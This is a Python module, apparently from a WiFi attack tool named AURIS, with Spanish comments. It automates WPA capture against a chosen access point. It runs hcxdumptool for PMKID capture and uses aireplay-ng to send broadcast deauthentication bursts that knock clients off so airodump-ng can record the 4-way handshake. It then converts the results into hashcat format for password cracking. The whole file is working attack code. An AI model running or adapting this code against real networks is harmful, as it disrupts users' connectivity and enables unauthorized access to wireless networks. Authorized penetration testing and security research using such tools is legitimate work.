"""
AURIS — adapters/capture.py
Adaptadores de captura de tráfico WiFi (hcxdumptool, airodump-ng, aireplay-ng).

Cada función de este módulo:
  - Hace UNA SOLA cosa (capturar PMKID, capturar handshake, deauth, etc.).
  - No toma decisiones de negocio (eso es tarea del pipeline).
  - No escribe al terminal.
  - Retorna un CaptureResult tipado.
"""

from __future__ import annotations

import glob
import os
import subprocess
import time
from dataclasses import dataclass, field
from typing import Optional

from .tool_runner import ToolResult, run_tool, tool_available


@dataclass
class CaptureResult:
    """Resultado de una operación de captura de radio."""
    captured:     bool          # True si hay material útil (pcap/hash) en el disco
    pcap_path:    Optional[str] = None   # Ruta al .pcapng o .cap capturado
    hc22000_path: Optional[str] = None  # Ruta al .hc22000 listo para crackeo
    tool_result:  Optional[ToolResult] = None
    timed_out:    bool = False
    error:        str = ""

    @property
    def has_hash(self) -> bool:
        return self.hc22000_path is not None and os.path.isfile(self.hc22000_path)


def _pcap_valid(path: str) -> bool:
    """Comprueba que el pcap existe y no está vacío (cabecera mínima = 24 bytes)."""
    try:
        return os.path.isfile(path) and os.path.getsize(path) > 24
    except OSError:
        return False


def convert_to_hc22000(pcap_path: str, out_dir: str) -> Optional[str]:
    """
    Convierte un .pcapng a formato hashcat 22000 usando hcxpcapngtool.
    Retorna la ruta al .hc22000 o None si no es posible la conversión.
    """
    if not tool_available("hcxpcapngtool"):
        return None
    if not _pcap_valid(pcap_path):
        return None

    out_path = os.path.join(out_dir, "handshake.hc22000")
    # Si ya existe y no está vacío, reutilizarlo
    if _pcap_valid(out_path):
        return out_path

    res = run_tool(
        ["hcxpcapngtool", "-o", out_path, pcap_path],
        timeout=30,
    )
    if res.ok and _pcap_valid(out_path):
        return out_path
    return None


def capture_pmkid(
    iface: str,
    bssid: str,
    out_dir: str,
    timeout: int = 60,
    max_rounds: int = 2,
) -> CaptureResult:
    """
    Captura PMKID usando hcxdumptool (sin necesidad de clientes asociados).

    Estrategia
    ──────────
    Ejecuta hasta `max_rounds` rondas de `timeout // max_rounds` segundos cada una.
    En cuanto haya material convertible a hc22000, retorna SUCCESS.
    Si hcxdumptool no está disponible, retorna immediately con captured=False.
    """
    if not tool_available("hcxdumptool"):
        return CaptureResult(captured=False, error="hcxdumptool not available")

    pcap_path = os.path.join(out_dir, "pmkid.pcapng")
    round_timeout = max(timeout // max_rounds, 10)

    for rnd in range(1, max_rounds + 1):
        res = run_tool(
            [
                "hcxdumptool",
                "-i", iface,
                "--filterlist_ap", bssid,
                "--filtermode=2",
                "-o", pcap_path,
                f"--rcascan={round_timeout}",
            ],
            timeout=round_timeout + 5,
            desc=f"PMKID rnd {rnd}/{max_rounds}",
        )
        hc_path = convert_to_hc22000(pcap_path, out_dir)
        if hc_path:
            return CaptureResult(
                captured=True, pcap_path=pcap_path,
                hc22000_path=hc_path, tool_result=res,
            )
        if _pcap_valid(pcap_path):
            return CaptureResult(
                captured=True, pcap_path=pcap_path, tool_result=res,
            )

    return CaptureResult(
        captured=False, timed_out=True,
        error="PMKID not captured after all rounds",
    )


def deauth_burst(
    iface: str,
    bssid: str,
    frames: int = 10,
    timeout: int = 30,
) -> ToolResult:
    """
    Envía una ráfaga de frames de desautenticación broadcast hacia el AP.
    Requiere aireplay-ng y modo monitor activo en la interfaz.
    """
    if not tool_available("aireplay-ng"):
        from .tool_runner import ToolResult as TR
        return TR(returncode=-1, stdout="", stderr="aireplay-ng not available",
                  timed_out=False, elapsed_sec=0)
    return run_tool(
        ["aireplay-ng", "--deauth", str(frames), "-a", bssid, iface],
        timeout=timeout,
        desc=f"Deauth ×{frames}",
    )


def verify_handshake_with_aircrack(cap_path: str) -> Optional[bool]:
    """
    Verifica si un .cap contiene un handshake 4-way válido usando aircrack-ng -J.
    Retorna True, False, o None si aircrack-ng no está disponible.
    """
    if not tool_available("aircrack-ng") or not _pcap_valid(cap_path):
        return None
    res = run_tool(["aircrack-ng", cap_path], timeout=30)
    combined = res.combined_output.lower()
    return "handshake" in combined


def capture_handshake(
    iface: str,
    bssid: str,
    channel: int,
    out_dir: str,
    timeout: int = 120,
    max_rounds: int = 3,
) -> CaptureResult:
    """
    Captura un handshake WPA 4-way mediante airodump-ng + deauth dirigido.

    Estrategia
    ──────────
    Ronda 1: hcxdumptool pasivo (más eficiente, sin inyección).
    Rondas 2..N: airodump-ng + deauth broadcast (requiere aireplay-ng).
    En cuanto se verifica un handshake real, retorna SUCCESS.

    El resultado incluye la ruta al .hc22000 convertido si hcxpcapngtool disponible.
    """
    pcap_path = os.path.join(out_dir, "handshake.pcapng")
    tools_available = {
        "hcxdumptool": tool_available("hcxdumptool"),
        "airodump-ng": tool_available("airodump-ng"),
        "aireplay-ng": tool_available("aireplay-ng"),
    }

    if not any(tools_available.values()):
        return CaptureResult(captured=False, error="no capture tools available")

    round_timeout = max(timeout // max_rounds, 20)

    # ── Ronda 1: hcxdumptool pasivo ───────────────────────────────────────────
    if tools_available["hcxdumptool"]:
        res = run_tool(
            [
                "hcxdumptool", "-i", iface,
                "--filterlist_ap", bssid,
                "--filtermode=2",
                "-o", pcap_path,
                f"--rcascan={round_timeout}",
            ],
            timeout=round_timeout + 5,
            desc="Captura pasiva rnd 1",
        )
        hc_path = convert_to_hc22000(pcap_path, out_dir)
        if hc_path:
            return CaptureResult(
                captured=True, pcap_path=pcap_path,
                hc22000_path=hc_path, tool_result=res,
            )

    # ── Rondas 2..N: airodump + deauth ───────────────────────────────────────
    if not (tools_available["airodump-ng"] and tools_available["aireplay-ng"]):
        # No hay herramientas de inyección → devolver lo que hay
        return CaptureResult(
            captured=_pcap_valid(pcap_path),
            pcap_path=pcap_path if _pcap_valid(pcap_path) else None,
            error="injection tools not available for round 2+",
        )

    start_round = 2 if tools_available["hcxdumptool"] else 1
    for rnd in range(start_round, max_rounds + 1):
        prefix = os.path.join(out_dir, f"hs_r{rnd}")
        cap_file = f"{prefix}-01.cap"
        try:
            proc = subprocess.Popen(
                [
                    "airodump-ng",
                    "-c", str(channel),
                    "--bssid", bssid,
                    "-w", prefix,
                    "--output-format", "pcap",
                    iface,
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except (OSError, FileNotFoundError):
            continue

        try:
            time.sleep(min(10, round_timeout))
            deauth_burst(iface, bssid, frames=10)
            time.sleep(max(round_timeout - 10, 5))
        finally:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()

        if verify_handshake_with_aircrack(cap_file):
            import shutil
            shutil.copyfile(cap_file, pcap_path)
            hc_path = convert_to_hc22000(pcap_path, out_dir)
            return CaptureResult(
                captured=True, pcap_path=pcap_path,
                hc22000_path=hc_path,
            )

    return CaptureResult(
        captured=False,
        timed_out=True,
        error=f"handshake not captured after {max_rounds} rounds",
    )


def find_crackable_material(out_dir: str) -> tuple[Optional[str], Optional[str]]:
    """
    Busca material crackeable existente en el directorio de evidencia.
    Retorna (hc22000_path, cap_path) — cualquiera puede ser None.
    """
    hc_path = os.path.join(out_dir, "handshake.hc22000")
    hc = hc_path if _pcap_valid(hc_path) else None

    cap = None
    for pat in ("handshake*.cap", "wpa.cap", "*-01.cap", "*.cap", "*.pcap"):
        for cand in sorted(glob.glob(os.path.join(out_dir, pat))):
            if _pcap_valid(cand):
                cap = cand
                break
        if cap:
            break

    return hc, cap
